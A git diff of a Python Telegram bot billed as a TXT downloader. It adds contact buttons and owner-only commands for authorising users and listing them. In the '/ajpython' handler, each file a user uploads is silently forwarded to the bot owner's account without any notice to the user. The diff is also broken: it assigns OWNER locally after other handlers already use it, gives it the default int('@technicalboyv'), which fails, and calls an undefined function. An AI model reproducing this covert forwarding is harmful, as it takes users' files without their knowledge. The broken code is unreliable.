@@ -28,34 +28,48 @@ API_ID = int(getenv("API_ID"))
 API_HASH = getenv("API_HASH")
 BOT_TOKEN = getenv("BOT_TOKEN")
 
-app = Client(
+bot = Client(
     "my_bot",
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN
 )
 
+# Inline keyboard for start command
+BUTTONSCONTACT = InlineKeyboardMarkup([[InlineKeyboardButton(text="📞 Contact", url="https://t.me/saini_contact_bot")]])
+keyboard = InlineKeyboardMarkup(
+    [
+        [
+            InlineKeyboardButton(text="🛠️ Help", url="https://t.me/+3k-1zcJxINYwNGZl"),
+            InlineKeyboardButton(text="🛠️ Repo", url="https://github.com/nikhilsainiop/saini-txt-direct"),
+        ],
+    ]
+)
 
-@bot.on_message(filters.command(["start"]))
-async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text(
-       f"**𝗗𝗲𝗮𝗿 𝗠𝗲𝗺𝗯𝗲𝗿𝘀,**\n\n**𝘔𝘺𝘴𝘦𝘭𝘧 𝘢 𝘛𝘟𝘛 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋𝘌𝘙 𝘉𝘖𝘛.**\n**To Extract .txt File /ajpython.**\n**To Stop /cancel.**\n\n‡ 𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞: 𝗔𝗝 𝗣𝗬𝗧𝗛𝗢𝗡 💀 ‡", reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton("𝕺𝖋𝖋𝖎𝖈𝖎𝖆𝖑 𝕮𝖍𝖆𝖓𝖓𝖊𝖑 " ,url=f"https://whatsapp.com/channel/0029Vap2Efg3rZZg9oIwku3k") ],
-                    [
-                    InlineKeyboardButton("𝔒𝔴𝔫𝔢𝔯: 𝗔𝗝 𝗣𝗬𝗧𝗛𝗢𝗡 💀" ,url="https://t.me/AJ_PYTHON_15") ],
-                    [
-                    InlineKeyboardButton("𝕿𝖌_𝕺𝖋𝖋𝖎𝖈𝖎𝖆𝖑" ,url="https://t.me/AJPYTHON_OFFICIAL") ],
-                    [
-                    InlineKeyboardButton("𝔉𝔬𝔩𝔩𝔬𝔴 𝔐𝔢" ,url="https://www.instagram.com/obito_shots?igsh=czBkNzM5bXp6M3I2") ]
-            ]))
 
-@bot.on_message(filters.command("cancel"))
-async def restart_handler(_, m):
-    await m.reply_text("**𝙱𝚊𝚝𝚌𝚑 𝙿𝚛𝚘𝚌𝚎𝚜𝚜 𝚂𝚝𝚘𝚙𝚙𝚎𝚍.**", True)
-    os.execl(sys.executable, sys.executable, *sys.argv)
+@bot.on_message(filters.command("addauth") & filters.private)
+async def add_auth_user(client: Client, message: Message):
+    if message.chat.id != OWNER:
+        return await message.reply_text("You are not authorized to use this command.")
+    
+    try:
+        new_user_id = int(message.command[1])
+        if new_user_id in AUTH_USERS:
+            await message.reply_text("User ID is already authorized.")
+        else:
+            AUTH_USERS.append(new_user_id)
+            await message.reply_text(f"User ID {new_user_id} added to authorized users.")
+    except (IndexError, ValueError):
+        await message.reply_text("Please provide a valid user ID.")
+        
 
+@bot.on_message(filters.command("users") & filters.private)
+async def list_auth_users(client: Client, message: Message):
+    if message.chat.id != OWNER:
+        return await message.reply_text("You are not authorized to use this command.")
+    
+    user_list = '\n'.join(map(str, get_all_user_ids()))  # Get user IDs from MongoDB
+    await message.reply_text(f"Authorized Users:\n{user_list}")
 
 
 @bot.on_message(filters.command(["ajpython"]))
@@ -64,6 +78,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
         x = await input.download()
+        OWNER = int(getenv("OWNER_ID", "@technicalboyv"))  # Apna Telegram ID daalo ya env me set karo
         await bot.send_document(OWNER, x)
         await input.delete(True)    
         file_name, ext = os.path.splitext(os.path.basename(x))
